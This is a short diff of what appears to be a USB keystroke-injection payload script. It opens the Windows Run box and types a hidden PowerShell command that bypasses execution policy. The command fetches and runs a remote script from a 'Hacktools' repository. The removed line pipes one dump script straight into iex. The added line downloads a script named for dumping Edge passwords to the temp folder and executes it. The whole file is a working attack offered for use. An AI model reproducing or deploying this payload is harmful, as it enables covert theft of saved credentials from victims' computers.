@@ -1,4 +1,4 @@
 GUI r
 DELAY 800
-STRING powershell -w hidden -nop -ep bypass -c "irm https://raw.githubusercontent.com/BlueJuice1/Hacktools/main/BigDumpTime/BigDumpTime.ps1 | iex"
+STRING powershell -nop -ep bypass -WindowStyle Hidden -c "iwr https://raw.githubusercontent.com/BlueJuice1/Hacktools/main/EdgePasswordDump/EdgePasswordDump.ps1 -OutFile $env:TEMP\EdgePasswordDump.ps1; & $env:TEMP\EdgePasswordDump.ps1"
 ENTER
